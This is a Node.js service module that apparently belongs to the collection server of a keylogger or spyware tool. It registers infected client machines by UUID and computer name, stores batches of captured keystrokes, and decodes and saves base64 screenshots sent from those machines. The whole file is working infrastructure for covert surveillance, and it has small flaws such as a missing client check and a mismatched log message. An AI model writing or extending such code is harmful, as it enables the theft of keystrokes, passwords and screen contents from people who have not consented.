'use strict'

const fs = require('fs')
const Client = require('../models/Client')
const clientDao = require('../dao/clientDao')
const { sequelize } = require('../models/Client')
const keylogsDao = require('../dao/keylogsDao')
const Keylog = require('../models/Keylog')
const screenshotsDao = require('../dao/ScreenshotsDao')
//const { now } = require('sequelize/types/lib/utils')

const clientService = {

    createOrUpdate: async function ({ uuid, data }) {

        // Call the DAO to find if a user exists or not
        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist, then we create it
        if (!(client instanceof Client)) {
            return { isNew: true, data: await this.create({ uuid, data }) }
        }

        // If he does exist, then we update it
        return { isNew: false, data: await this.update({ uuid, data }) }
    },
    create: async function ({ uuid, data }) {

        const client = await clientDao.insertOne({
            uuid: uuid,
            computerName: data.computerName
        })

        return client
    },
    update: async function ({ uuid, data }) {

        const client = await clientDao.updateOne({
            uuid: uuid,
            computerName: data.computerName
        })

        return client
    },
    addKeylogs: async function ({ uuid, data }) {

        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist
        if (!(client instanceof Client)) {
            return { isAdded: false }
        }

        const clientId = client.dataValues.id
        let isAdded = false

        if (data instanceof Array) {
            for (const element of data) {
                const keylogs = await keylogsDao.insertOne({ clientId, element })

                if (keylogs instanceof Keylog)
                    isAdded = true
            }
        }

        return { isAdded: isAdded }
    },



    addScreenshot: async function ({ uuid, data }) {

        const client = await clientDao.findOneByUuid(uuid)
        const clientId = client.dataValues.id


        const screenshot = Buffer.from(data.screenshot, 'base64')

        const filename = Date.now() + '.jpeg'

        fs.writeFile(filename, screenshot, (err) => {
            if (err) throw err;
            console.log('The binary data has been decoded and saved to my-file.png');
        });

        screenshotsDao.insertOne({ clientId, filename })

        return { isAdded: true }
    }
}

module.exports = clientService